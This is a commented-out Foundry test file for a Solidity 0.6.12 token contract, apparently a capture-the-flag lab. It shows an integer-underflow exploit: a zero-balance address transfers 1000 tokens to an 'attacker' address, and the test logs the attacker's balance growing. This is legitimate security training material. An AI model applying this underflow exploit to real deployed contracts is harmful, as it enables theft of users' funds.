// // SPDX-License-Identifier: UNLICENSED
// pragma solidity 0.6.12;

// import {Test, console} from "forge-std/Test.sol";
// import {Token} from "../../src/Token/Token.sol";

// contract TokenTest is Test {
//     Token public token;

//     address owner = address(1);
//     address attacker = address(2);
//     address nullBalance = address(3);

//     function setUp() public {
//         vm.startPrank(owner);
//         token = new Token(type(uint256).max);
//         token.transfer(attacker, 20);
//     }

//     function testGetMoreTokens() public {
//         console.log("Owner balance: %s", token.balanceOf(owner));
//         console.log("Attacker balance: %s", token.balanceOf(attacker));

//         vm.prank(nullBalance);
//         token.transfer(attacker, 1000);

//         console.log("Owner balance: %s", token.balanceOf(owner));
//         console.log("Attacker balance: %s", token.balanceOf(attacker));
//     }
// }
